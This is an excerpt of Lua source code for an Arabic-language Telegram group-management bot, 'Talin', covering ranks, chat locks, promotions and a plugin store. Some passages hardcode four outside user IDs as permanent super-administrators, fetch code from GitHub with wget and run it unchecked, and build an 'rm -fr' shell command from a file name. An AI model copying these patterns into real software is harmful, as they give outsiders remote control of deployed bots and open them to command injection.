...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Absat541/talian/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO, 1647663520,1593178008,1442574372, 984962441}   
...
if tonumber(user_id) == tonumber( 1647663520) then  
var = true  
elseif tonumber(user_id) == tonumber(1593178008) then
var = true  
elseif tonumber(user_id) == tonumber(1442574372) then
var = true
elseif tonumber(user_id) == tonumber( 984962441) then
var = true
...
os.execute('wget https://raw.githubusercontent.com/Absat541/talian/master/BOYKA.lua')
send(msg.chat_id_, msg.id_,'   -︙ تم تحديث السورس \n   -︙ لديك اخر اصدار لسورس تالين\n   -︙ الاصدار » { 1.3v}')
dofile('BOYKA.lua')  
end
if text == 'الاصدار   -︙' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'   -︙ اصدار سورس تالين \n   -︙ الاصدار »{ 1.3v}')
end
if text == 'قناه تحديثات البوت   -︙' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'   -︙ [تحديثات البوت](t.me/TALED_SORCE) \n   -︙ [قناه السورس](t.me/Al_9ll)')
end
...
usertext = '\n   -︙ العضو » ['..result.title_..'](t.me/'..(username or ' Al_9ll')..')'
status  = '\n   -︙ تم ترقيته مطور'
...
usertext = '\n   -︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or ' Al_9ll')..')'
status  = '\n   -︙ تم ترقيته مطور'
...
if BOYKA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'   -︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or ' Al_9ll')..') \n   -︙ '..BOYKA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0,"   -︙ العضو : {["..data.first_name_.."](T.ME/ Al_9ll)}\n   -︙ ["..BOYKA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "   -︙ عذرا » {["..data.first_name_.."](T.ME/ Al_9ll)}\n   -︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
Text = [[
⚙︙[𝐒𝐎𝐔𝐑𝐂𝐄 𝐓𝐀𝐋𝐈𝐍 .](t.me/Al_9ll)
┉ ┉ ┉ ┉𝑇𝐿┉ ┉ ┉ ┉
👨🏻‍💻︙[𝙰𝙷𝙼𝙴𝙳 𖠐.](t.me/Ar_9ll)
👨🏻‍💻︙[𝚃𝙸𝙶𝙴𝚁 𖠐.](t.me/T_G120)
👨🏻‍💻︙[𝙴𝙻𝙾𝚂𝚃𝙾𝚁𝙰 𖠐.](t.me/elostoraelmalek)
┉ ┉ ┉ ┉𝑇𝐿┉ ┉ ┉ ┉
💌︙[𝚃𝚆𝚂𝙻 𖠐.](t.me/ta_lin9bot) 
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'   -︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or ' Al_9ll')..') \n   -︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'   -︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or ' Al_9ll')..') \n   -︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Absat541/talian/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n   -︙ اهلا بك في متجر ملفات تالين\n   -︙ ملفات السورس ↓\n◎ ══════ ❈ ══════ ◎\n\n"
local TextE = "\n◎ ══════ ❈ ══════ ◎\n   -︙ علامة تعني { ✓ } ملف مفعل\n   -︙ علامة تعني { ✘ } ملف معطل\n   -︙ قناة سورس تالين ↓\n".."   -︙ [اضغط هنا لدخول](t.me/ Al_9ll) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Absat541/talian/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('BOYKA.lua')  
else
send(msg.chat_id_, msg.id_,"   -︙ عذرا الملف لايدعم سورس تالين \n") 
end
return false
end
...
local UserName = (b.username_ or " Al_9ll")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n   -︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or ' Al_9ll')..')'
status  = '\n   -︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n   -︙ العضو » '..userid..''
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n   -︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or ' Al_9ll')..')'..'\n   -︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'تالين').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'تالين')
local BOYKA_Msg = {
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'تالين').." غادر" or text == 'غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or ' Al_9ll')..')'
local iduser = result.sender_user_id_
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'تالين')
